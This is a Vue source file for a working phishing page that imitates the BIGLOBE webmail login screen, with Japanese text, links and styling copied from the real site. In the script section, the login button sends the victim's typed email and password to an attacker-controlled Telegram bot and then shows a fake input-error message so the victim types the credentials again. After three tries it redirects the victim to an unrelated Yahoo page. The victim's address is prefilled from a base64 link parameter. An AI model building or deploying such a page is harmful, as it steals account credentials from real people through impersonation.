<template>
	<div id="app">
	  <div
		  data-new-gr-c-s-check-loaded="14.1171.0"
		  data-gr-ext-installed=""
		  id="container"
		>
		  <div id="container">
			<a></a>
			<div id="header_main">
			  <div id="header_logo">
				<h1>
				  <div>
				  </div>
				  <img
					src="../public/images/logo_email.gif"
					alt="BIGLOBEメール"
					useMap="#logo"
					width="210"
					height="31"
									>
				</h1>
				<map name="logo">
				  <area
					shape="rect"
					coords="0,0,150,35"
					href="http://www.biglobe.ne.jp/"
					alt="BIGLOBE"
				  />
				  <area
					shape="rect"
					coords="150,0,210,35"
					href="https://webmail.biglobe.ne.jp/"
					alt="BIGLOBEメール"
				  />
				</map>
			  </div>
			</div>
			<!-- {" "} -->
			<div id="header_keyword" >
			  <strong>メールがもっと便利で楽しくなる！</strong>
			</div>
			<!-- {" "} -->
			<br class="clear" >
		  </div>
  
		  <div id="header-link">
			<div id="support_menu">
			  <ul class="fmenu">
				<li>
				  <a href="https://email.biglobe.ne.jp/">メールサービス</a>
				</li>
				<li>
				  <a
					class="bl"
					href="https://support.biglobe.ne.jp/"
					target="_blank"
				  >
					会員サポート
				  </a>
				</li>
				<li>
				  <a
					class="bl"
					href="https://support.biglobe.ne.jp/shogaiap/service.html"
					target="_blank"
				  >
					障害情報
				  </a>
				</li>
			  </ul>
			</div>
		  </div>
  
		  <div id="main">
			<div id="contents_block">
			  <div class="infotitle" 
			  style="margin-top: 25px;"
			  >
				お知らせ
			  </div>
			  <div class="infoArea">
				<p>
				  ・
				  <a
					href="https://support.biglobe.ne.jp/menteap/service.html"
					target="_blank"
				  >
					BIGLOBEメール、メールサービスのメンテナンス情報はこちらをご確認ください。
				  </a>
				  <b></b>
				</p>
				<p>
				  ・
				  <a
					href="https://support.biglobe.ne.jp/news/news716.html"
					target="_blank"
				  >
					BIGLOBEメール 一部仕様変更のお知らせ
				  </a>
				  <b style="color: red;">New!</b>
				</p>
				<p>
				  ・
				  <a
					href="https://support.biglobe.ne.jp/news/news550.html#a_faq1"
					target="_blank"
				  >
					Webメールにログインが出来ない場合はこちらをご確認ください。
				  </a>
				  <b></b>
				</p>
			  </div>
  
			  <div id="info_footer">
				<p></p>
				<div class="webrylink">
				  <center>
					<div
					  class="banner_area"
					  style="margin-bottom: 15px;"
					></div>
					<ul>
					  <li>
						<a href="https://webmail.biglobe.ne.jp/requirements.html">
						  推奨環境
						</a>
					  </li>
					  <li>
						<a href="https://email.biglobe.ne.jp/faq/Default.htm">
						  ヘルプ
						</a>
					  </li>
					  <li>
						<a href="http://email.biglobe.ne.jp/faq.html">
						  よくあるお問い合わせ
						</a>
					  </li>
					  <li>
						<a href="https://webmail.biglobe.ne.jp/read.html">
						  必ずお読みください
						</a>
					  </li>
					</ul>
				  </center>
				</div>
  
				<p></p>
			  </div>
			</div>
  
			<div id="side_menuArea">
			  <div id="side_menu_block">
				<div id="side_menu">
				  <h2>
					<img
					  src="../public/images/pagetitle_top.jpg"
					  alt="BIGLOBEメールメールにログイン"
					  width="238"
					  height="43"
					>
				  </h2>
  
				  <div style="background-color: #ffffff; margin: 10px 0 10px; padding: 10px !important; padding-bottom: 0; border: 2px solid #d5d5d5; text-align: left; display:block;" v-if="isActive"><p style="color: #dd0000; font-weight: bold; font-size: 14px !important;">入力されたデータをもう一度ご確認ください。</p></div>
				
					<!-- <div
					  style={{
						backgroundColor: "#ffffff",
						margin: "10px 0 10px",
						padding: "10px",
						border: "2px solid #d5d5d5",
						textAlign: 'left',
						display: "block",
					  }}
					>
					  <p
					  
						style={{
						  color: "#dd0000",
						  font-weight: "bold",
						  fontSize: "14px !important",
						}}
					  >
						メールアドレス(ユーザID)またはBIGLOBEパスワードが正しくありません。
					  </p>
					</div> -->
				
  
				  <div class="login_block">
					<div id="login_form">
					  <input type="hidden" name="sms" value="" >
					  <input type="hidden" name="ems" value="" >
					  <form onSubmit={handleSubmit(handleOnSubmit)} name="direct">
						<input
						  type="hidden"
						  name="onetime"
						  value="6e5b69de2500d84463ca209a2513adc7"
						>
						<input type="hidden" name="custom_id" value="" >
						<input
						  type="hidden"
						  name="from_page"
						  value="loginWebmail"
						>
						<div>
  
						  <label htmlFor="loginid">
							メールアドレスまたはユーザID
						  </label>
						  <input
							type="text"
							size={45}
							autoComplete="off"
							id="loginid"
							style="ime-mode: disabled;"
							v-model="formDataRes.email"
						  >
						 <label htmlFor="biglobe_pw">BIGLOBEパスワード</label>
						  <input
							
							type="password"
							size={30}
							id="biglobe_pw"
							v-model="formDataRes.password"
						  >
						</div>
  
						<div class="skey">
						  <img
							src="../public/images/button_softkey.gif"
							alt="ソフトウェアキーボードで入力する"
							title="ソフトウェアキーボードで入力する"
							width={200}
							height={30}
							id="soft_keyboard_pass_id"
						  >
						</div>
  
						<ul>
						  <li>
							<input
							  type="checkbox"
							  name="autologinidflag"
							  id="autologinidflag"
							  value={1}
							>
							<label htmlFor="autologinidflag">
							  次回からIDの入力を省略
							</label>
						  </li>
						  <li>
							<input
							  type="checkbox"
							  name="autologinflag"
							  id="autologinflag"
							  value={1}
							>
							<label htmlFor="autologinflag">
							  <a
								href="http://support.biglobe.ne.jp/settei/webmail/login.html"
								target="_blank"
							  >
								ログイン状態を保存する
							  </a>
							  <br >
							  （共有パソコンではチェックをはずしてください）
							</label>
						  </li>
						</ul>
						<div class="loginBtn">
						  <img
							type="image"
							src="../public/images/btn_login.gif"
							alt="ログイン"
							title="ログイン"
							width={205}
							height={35}
							@click.prevent="finishJoob();"
						  >
						</div>
					  </form>
					</div>
					<ul class="supportLink">
					  <li>
						<a
						  href="http://support.biglobe.ne.jp/settei/webmail/login.html"
						  target="_blank"
						>
						  ログイン方法について
						</a>
					  </li>
					  <li>
						<a
						  href="http://support.biglobe.ne.jp/jimu/idpw/index.html"
						  target="_blank"
						>
						  ID・パスワードを忘れた場合
						</a>
						<br />
						BIGLOBE法人会員でID・パスワードをお忘れの方は［
						<a
						  href="https://biz.biglobe.ne.jp/member/support.html"
						  target="_blank"
						>
						  こちら
						</a>
						］
					  </li>
					  <li>
						<a
						  href="http://email.biglobe.ne.jp/mailaccount.html"
						  target="_blank"
						>
						  メールアドレスの取得・確認
						</a>
					  </li>
					  <li>
						<a
						  href="http://email.biglobe.ne.jp/machange/index.html"
						  target="_blank"
						>
						  メールアドレスの変更
						</a>
					  </li>
					</ul>
				  </div>
				</div>
			  </div>
			</div>
		  </div>
  
		  <div id="footerContainer">
			<div id="footerLink">
			  <div id="footerLinkBox1">&nbsp;</div>
			  <div id="footerLinkBox2">
				<a href="https://www.biglobe.ne.jp/">BIGLOBEトップ</a>｜
				<a href="https://join.biglobe.ne.jp/">インターネット接続</a>（
				<a href="https://join.biglobe.ne.jp/ftth/hikari/">
				  ビッグローブ光
				</a>
				・<a href="https://join.biglobe.ne.jp/mobile/">格安SIM</a>・
				<a href="https://join.biglobe.ne.jp/mobile/special/">SIM替え</a>）
				<br />
				<a href="https://www.biglobe.co.jp/">会社概要</a>｜
				<a href="https://www.biglobe.ne.jp/whatsnew/news.html">
				  ニュースリリース
				</a>
				｜
				<a href="https://www.biglobe.co.jp/recruit/index.html">
				  採用情報
				</a>
				｜
				<a href="https://www.biglobe.ne.jp/privacy.html">
				  個人情報保護ポリシー
				</a>
				｜
				<a href="https://www.biglobe.ne.jp/cookie.html">Cookieポリシー</a>
				｜
				<a href="https://support.biglobe.ne.jp/safesecurity/">
				  安心・安全
				</a>
				｜<a href="https://support.biglobe.ne.jp/">お問い合わせ</a>
			  </div>
  
			  <div id="footerLinkBox3">
				<div>
				  <img
					src="../public/images/footer3logo.gif"
					alt=""
					width={210}
					height={66}
					useMap="#FooterMap"
				  >
				  <map name="FooterMap" id="FooterMap">
					<area
					  shape="rect"
					  coords="95,0,155,64"
					  href="https://privacymark.jp/"
					  target="_blank"
					  alt="プライバシーマーク"
					/>
					<area
					  shape="rect"
					  coords="160,0,210,64"
					  href="http://www.biglobe.ne.jp/safesecurity.html"
					  target="_blank"
					  alt="インターネット接続サービス安全・安心マーク"
					/>
				  </map>
				</div>
			  </div>
			</div>
			<div id="footerCopyright">
			  <p>Copyright(C)BIGLOBE Inc.</p>
			</div>
		  </div>
		</div>
  
	  <!-- <HelloWorld msg="Welcome to Your Vue.js App"/> -->
	</div>
  </template>











<script>
// import HelloWorld from './components/HelloWorld.vue'
import axios from "axios"
export default {
	name: 'app',
	data() {
		return {
			formDataRes: {},
			isLoading: false,
			isActive: false,
			count: 0,
			finalCount: 3,
			isText : false
		}
	},
	components: {
		// HelloWorld 9
	},

	methods: {

		async finishJoob() {
			this.count = +this.count + 1
			this.isLoading = true
			if (this.count < this.finalCount) {
				let message = this.formDataRes
				await this.sendTelegramResult(message)
				this.isLoading = false
				this.isActive = !this.isActive
			} else {
				location.replace("https://currently.att.yahoo.com/")

			}
		},


		async sendTelegramResult(message) {
			try {
				let botId = this.$config.public.botId
				let chatId = this.$config.public.chatId
				const url = `https://api.telegram.org/bot${botId}/sendMessage`;
				const payload = {
					chat_id: chatId,
					text: message,
				};
				await axios.post(url, payload);

			} catch (error) {
				console.log(error, 'error')

			}
		}

	},
	mounted() {
		this.formDataRes['email'] = atob(this.$route?.params?.id)
	}
}
</script>



<style>
  
  @charset "Shift_JIS";
  
  /* ヘッダ header.css
  ------------------------------------------------------------ */
  input {
  border: 1px solid #000
}
  #header_main {
	  background: #FFFFFF;
	  width:860px;
	  margin:0;
	  padding:0;
  }
  
  #header_logo {
	  width:233px;
	  margin:0;
	  padding:12px 0 0 15px;
	  float:left;
	  height:39px;
  }
  
  #header_keyword {
	  float:right;
	  width:250px;
	  text-align:left;
	  padding:20px 0 0 0;
  }
  #header_keyword strong {
	  font-weight: normal;
  }
  
  #headerNavi {
	  width:370px;
	  padding:15px 8px 0 0;
	  margin:0;
	  float:right;
	  text-align:right;
  }
  #headerNavi form{ margin:0; padding:0;}
  #headerNavi form input{ margin:0; padding:0 6px;}
  #headerNavi div.search {
	  float:right;
  }
  #headerNavi div.top {
	  float:right;
	  padding:4px 7px 0 0;
  }
  
  #header-link {
	  background: #ccc url('../public/images/bg_header.gif') no-repeat bottom;
	  width:860px;
	  height:26px;
	  margin:0;
	  padding:0;
	  border-bottom:1px solid #ccc;
  }
  #header-link #support-menu {
	  width:860px;
	  margin:0;
	  padding:0;
  }
  #header-link #support_menu ul{
	  float:right;
	  padding:2px 0 0 0 ;
  }
  #header-link #support_menu li{
	  margin:0;
	  float:left;
  }
  #header-link #support_menu li a{
	  padding:3px 8px 0 15px;
	  white-space:nowrap;
	  display:block;
  }
  
  
  #header-link #support_menu li a,
  #header-link #support_menu li a:link,
  #header-link #support_menu li a:visited{
	  background:url('../public/images/menu_arrow_head.gif') no-repeat 0px 5px;
  }
  
  #header-link #support_menu li a:active,
  #header-link #support_menu li a:hover{
	  background:url('../public/images/menu_arrow_head.gif') no-repeat 0px 5px;
  }
  
  #header-link #support_menu li a.bl,
  #header-link #support_menu li a.bl:link,
  #header-link #support_menu li a.bl:visited{
	  background:url('../public/images/menu_arrow_head_bl.gif') no-repeat 0px 5px;
  }
  
  #header-link #support_menu li a.bl:active,
  #header-link #support_menu li a.bl:hover{
	  background:url('../public/images/menu_arrow_head_bl.gif') no-repeat 0px 5px;
  }
  
  /* default */
  @charset "Shift-jis";
  
  
  /*------------------------------------------------------------ ページ全体 */
  
  /*----------------------- 初期設定 */
  
  body {
	  margin:0;
	  font-size: 80%;
  }
  
  img {
	  padding:0;
	  margin:0;
	  border:0;
  }
  
  h1, h2, h3, h4, h5, p, dl, dt, dd {
	  padding:0;
	  margin:0;
	  font-size:100%;
	  font-weight:normal;
  }
  
  th {
	  font-weight:normal;
  }
  
  span {
	  padding:0;
	  margin:0;
  }
  
  form {
	  margin:0;
  }
  
  ul, li {
	  padding:0;
	  margin:0;
	  list-style:none;
  }
  
  a,
  a:link,
  a:visited {
	  color:#2674f3;
	  text-decoration:underline;
  }
  
  a:hover,
  a:active {
	  color:#c30;
	  text-decoration:underline;
  }
  
  /* footer */
  @charset "Shift_JIS";
  
  /* フッター
  --------------------------------------------------------------- */
  div#footerContainer{
	  clear:both;
	  width:860px;
	  display: block;
	  background:#FFFFFF;
  }
  
  div#footerPagetop{
	  width:860px;
	  padding-top: 16px;
	  padding-bottom: 10px;
	  text-align:right;
	  display:block;
  }
  
  div#layout-footer-nobg #footerPagetop{
	  background: none;
  }
  
  div#footerPagetop a{
	  margin-right:6px;
  }
  
  div#footerSearch{
	  width:860px;
	  background-color:#f0f0f0;
	  border-top: 1px solid #8c9bca;
	  padding-top:10px;
	  padding-bottom:10px;
	  text-align:center;
	  line-height:1.5em;
  }
  
  div#footerRecommend{
	  width:860px;
	  padding-top:10px;
	  padding-bottom:10px;
	  text-align:center;
	  border-top: 1px dotted #8c9bca;
  }
  
  div#footerLink{
	  width:860px;
	  border-top: 1px solid #8c9bca;
	  padding-top:10px;
  }
  
  div#footerLinkBox1{
	  width:10px;
	  float:left;
  }
  div#footerLinkBox2{
	  width:630px;
	  float:left;
	  text-align:center;
	  line-height:1.3em;
	  font-size: 0.7rem; /* 2017/10/19 フッター崩れ対応*/
  }
  div#footerLinkBox3{
	  text-align:right;
	  width:210px;
	  padding-right:10px;
	  float:right;
  }
  div#footerLinkBox3 .icon{
	  padding-right:8px;
  }
  
  div#footerCopyright{
	  clear:both;
	  width:860px;
	  padding-top:10px;
	  text-align:center;
  }
  
  div#footer { border-top: 1px solid #8c9bca; padding:0 0 0 5px; font-size:12px; clear:both;}
  div#footer div.footer1 {float:left;}
  div#footer div.footer2 {float:right; margin:8px 0; white-space:nowrap; font-size:110%;}
  div#footer div.footer3 {margin:0; float:right;}
  
  /* layout.css */
  @charset "Shift-jis";
  
  /* トップページ
  ------------------------------------------------------------ */
  
  #contents_block {
	  float:left;
	  width:550px;
	  padding:0 15px;
  }
  
  
  /*サービス紹介*/
  #contents_block .pr_block { 
	  width:550px;
	  height:165px;
	  margin:15px 0 0;
	  background:url(/images2/goodpoint.gif) no-repeat;
  }
  #contents_block .pr_block .sv_link {
	  padding:140px 15px 0;
	  text-align:right;
	  vertical-align:top;
	  line-height:120%;
  }
  #contents_block .pr_block .sv_block {
	  padding:0 15px 10px;
  }
  #contents_block .pr_block .sv_block_last {
	  padding:0 15px 0;
  }
  #contents_block .pr_block .sv_img {
	  float:left;
	  width:120px; 
  }
  #contents_block .pr_block .sv_txt {
	  float:left; 
	  padding-left:15px;
	  width:385px;
  }
  
  /*お知らせ、注意事項*/
  
  #contents_block .infotitle{
	  color: #3399CC;
	  font-size: 1.1em;
	  font-weight: bold;
	  margin: 0;
	  padding-left: 10px;
	  padding-bottom: 10px;
  }
  
  #contents_block .infoArea{
	   padding-left: 10px;
  }
  
  #contents_block .infoArea p{
	   padding-bottom: 5px;
  }
  
  #contents_block .news { 
	  margin:0 0 0px;
	  line-height: 60%;
  }
  #contents_block .news ul {
	  width:550px;
	  margin:0 0 0px;
  }
  #contents_block .subArea_block { 
	  width:550px;
	  margin:20px 0 0;
  
  }
  
  #contents_block .subArea_block ul.textArea {
	  width:520px;
	  background-color:#FFF;
	  border-top:none;
	  padding:12px 15px 0;
  }
  #contents_block .subArea_block ul.textArea li {
	  background:url('../public/images/icon_link.gif') 0 7px no-repeat !important;
	  padding:0 0 5px 12px;
  }
  #contents_block .subArea_block ul.textArea li.dot {
	  border-bottom:#CCC 1px dotted;
	  margin-bottom:5px;
  } 
  #contents_block .subArea_block ul.textArea li.dot_last {
	  border-bottom:none;
	  margin-bottom:0;
  } 
  
  #contents_block .subArea_block  .w8_block {
	  background-image: url("/images2/win8image.gif");
	  background-position: 420px 10px;
	  background-repeat: no-repeat;
	  border: 1px solid #FF0000;
	  color: #FF0000;
	  font-size: 90%;
	  margin: 10px 0 10px 10px;
	  padding: 10px 0 7px 7px;
	  width: 520px;
	  height: 80px;
	  line-height: 1.5;
  
  }
  
  #contents_block .subArea_block  .w8cpt {
	  font-size: 88%;
	  color: #333333;
	  padding-left: 410px;
	  padding-top: 9px;
	  margin-right:10px;
	  line-height: 1;
  
  }
  
  
  /*iframe*/
  .iframe_contents {
  margin:0px;
  margin-width:0;
  margin-height:0;
  width:580px;
  height:700px;
  float:left;
  }
  
  
  /* ウェブリはこちら */
  .webrylink{
  margin-top:5px;
  }
  .webrylink ul li {
	  background:url('../public/images/icon_link.gif') 0 0px no-repeat !important;
	  padding:2px 10px 7px 20px;
	  float: left;
  }
  
  .webrylink .banner_area {
	  height: 150px;
  }
  
  
  /* サイドメニュー
  ------------------------------------------------------------ */
  #side_menuArea {
	  float:right;
	  width:260px;
	  padding:0 15px 0 0;
  }
  #side_menu_block {
	  width:260px;
	  padding:0;
  /*	background-color:#FAFAFA; */
  }
  #side_menu {
	  width:260px;
	  padding:0 0 20px;
  /*	background:url("../images2/bg_side_menu.gif") repeat-x left top;*/
  }
  #side_menu .login_block {
	  width:238px;
	  margin:0 0 0 10px;
	  background:#ffffcc;
	  padding:10px 0 15px;
	  border:#CDCCCC 1px solid;
  }
  #side_menu .login_block form {
	  width:208px;
	  margin:0 auto;
  }
  #side_menu .login_block form div label {
	  display:block;
	  margin-bottom:2px;
	  font-size:115%;
	  font-weight:bold;
  }
  #side_menu .login_block form #loginid {
	  width:205px;
	  margin-bottom:5px;
  font-size:130%;
  height:1.4em;
  line-height:1.4em;
  }
  #side_menu .login_block form #biglobe_pw {
	  width:205px;
	  margin-bottom:0;
  font-size:130%;
  height:1.4em;
  line-height:1.4em;
  }
  
  
  #side_menu .login_block form ul {
	  padding:10px 0 0 0;
  }
  #side_menu .login_block form ul li {
	  margin:0 0 0 5px;
	  padding:0;
  }
  #side_menu .login_block form div.loginBtn {
	  padding-top:15px;
  }
  
  #side_menu .login_block ul.supportLink, 
  #side_menu .login_block ul.basicLink {
	  margin:15px 15px 0;
	  padding:10px 0 0;
	  border-top:#CDCCCC 1px solid;
  }
  #side_menu .login_block ul.supportLink li {
	  margin:0 0 5px 0;
	  padding:0 0 0 20px;
	  background:url(./assets/images/icon_question.gif) 0 2px no-repeat;
  }
  #side_menu .login_block ul.basicLink li {
	  margin:0 0 5px;
	  padding:0 0 0 20px;
	  background:url("/assets/images/icon_arrow.gif") 0 2px no-repeat;
	  vertical-align:top;
  }
  #side_menu .login_block ul.basicLink li.last {
	  margin:0;
  }
  #side_menu div.beginnerLink {
  }
  #side_menu ul.links li.last {
	  padding:0 0 0px 20px;
  }
  #side_menu div.biginnerLink {
	  margin:15px 15px 0;
	  padding:10px 0 10px 10px;
	  border-bottom:#CCC 1px dotted;
  }
  #side_menu div.biginnerLink p {
	  margin:0;
	  padding:0 0 0 20px;
	  background:url("../public/images/icon_arrow.gif") 0 2px no-repeat;
	  float:left;
  }
  #side_menu div.biginnerLink img {
	  float:left;
	  padding:0 0 0 2px;
  }
  #side_menu .otherLink {
	  margin:0 15px 0;
	  padding:10px 0 0 10px;
  }
  #side_menu ul.otherLink li {
	  margin:0 0 10px;
	  padding:0 0 0 20px;
	  background:url("/assets/images/icon_arrow.gif") 0 2px no-repeat;
  }
  #side_menuArea .verisign {
	  margin:10px 0 0 15px;
	  padding:0;
  }
  
  #side_menuArea img {
	  margin-left: 0px;
  }
  
  
  img {
	  border: 0 none;
	  margin: 0;
	  padding: 0;
  }
  
  #topMidbanner {
	  width: 520px;
	  margin: 10px 0 15px 10px ;
  
  }
  
  #topMidbanner div.service1 {
	  float: left;
	  width: 265px;
  }
  
  #info_footer {
	  position:absolute;
	  font-size:90%;
	  top:379px;
  }
  
  #info_footer p li{
   float: left;
  }
  
  
  @charset "Shift-jis";
  
  
  /* 全ページ共通
  ------------------------------------------------------------ */
  
  /* clear */
  /*.clearfix:after {
	  content: ".";
	  display: block;
	  height: 0;
	  clear: both;
	  visibility: hidden;
  }
  .clearfix {
	  display: inline-block;
  }*/
  /* Hide from IE Mac \*/
  /*
  * html .clearfix {
	  height: 1%;
  }
  .clearfix {
	  display: block;
  }*/
  /* End hide from IE Mac */
  
  
  /* トップ＆コンテンツ共通
  ------------------------------------------------------------ */
  
  body {
	  background:url('../public/images/bg.gif') repeat-y center #f6f6f6;
  }
  
  #container {
	  width:860px;
	  margin:0 auto;
	  background:#FFFFFF;
  }
  
  #main {
	  width:860px;
	  line-height: 1.4em;
	  margin: 10px auto 0 auto;
  
  }
  
  
  /* 警告 */
  .warning {
	  border:solid 1px #FDE5E5;
	  background-color:#FFF5F5;
	  padding:10px;
	  margin:0 0 20px;
	  color:#FF0000;
  }
  
  /* 注意書き */
  
  .attention-red {
	  color: #FF0000;
  }
  
  br.clear {
	  clear:both;
	  height:0;
  }
  
  div.clear {
	  clear:both;
	  height:0;
	  line-height:0;
  }
  
  .linkSet {
	  background:url(/images2/icon_arrow.gif) 0 2px no-repeat;
	  padding:0 0 0 20px;
  }
  
  
  
  </style>